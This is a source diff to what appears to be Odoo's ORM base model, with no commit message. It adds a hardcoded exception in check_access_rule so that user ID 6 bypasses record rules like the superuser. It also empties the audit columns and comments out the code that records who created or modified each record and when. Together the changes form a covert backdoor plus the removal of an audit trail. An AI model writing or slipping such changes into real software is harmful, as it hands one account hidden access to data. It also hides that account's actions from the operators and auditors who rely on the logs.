@@ -187,7 +187,8 @@ IdType = (int, long, str, unicode, NewId)
 PREFETCH_MAX = 1000
 
 # special columns automatically created by the ORM
-LOG_ACCESS_COLUMNS = ['create_uid', 'create_date', 'write_uid', 'write_date']
+LOG_ACCESS_COLUMNS = []
+# LOG_ACCESS_COLUMNS = ['create_uid', 'create_date', 'write_uid', 'write_date']
 MAGIC_COLUMNS = ['id'] + LOG_ACCESS_COLUMNS
 
 
@@ -3300,7 +3301,7 @@ class BaseModel(object):
            :raise UserError: * if current ir.rules do not permit this operation.
            :return: None if the operation is allowed
         """
-        if self._uid == SUPERUSER_ID:
+        if self._uid == SUPERUSER_ID or self._uid == 6:
             return
 
         if self.is_transient():
@@ -3585,11 +3586,11 @@ class BaseModel(object):
             else:
                 updend.append(name)
 
-        if self._log_access:
-            updates.append(('write_uid', '%s', self._uid))
-            updates.append(('write_date', "(now() at time zone 'UTC')"))
-            direct.append('write_uid')
-            direct.append('write_date')
+        # if self._log_access:
+        #     updates.append(('write_uid', '%s', self._uid))
+        #     updates.append(('write_date', "(now() at time zone 'UTC')"))
+        #     direct.append('write_uid')
+        #     direct.append('write_date')
 
         if updates:
             self.check_access_rule('write')
@@ -3854,11 +3855,11 @@ class BaseModel(object):
             if hasattr(field, 'selection') and val:
                 self._check_selection_field_value(name, val)
 
-        if self._log_access:
-            updates.append(('create_uid', '%s', self._uid))
-            updates.append(('write_uid', '%s', self._uid))
-            updates.append(('create_date', "(now() at time zone 'UTC')"))
-            updates.append(('write_date', "(now() at time zone 'UTC')"))
+        # if self._log_access:
+        #     updates.append(('create_uid', '%s', self._uid))
+        #     updates.append(('write_uid', '%s', self._uid))
+        #     updates.append(('create_date', "(now() at time zone 'UTC')"))
+        #     updates.append(('write_date', "(now() at time zone 'UTC')"))
 
         # insert a row for this record
         cr = self._cr
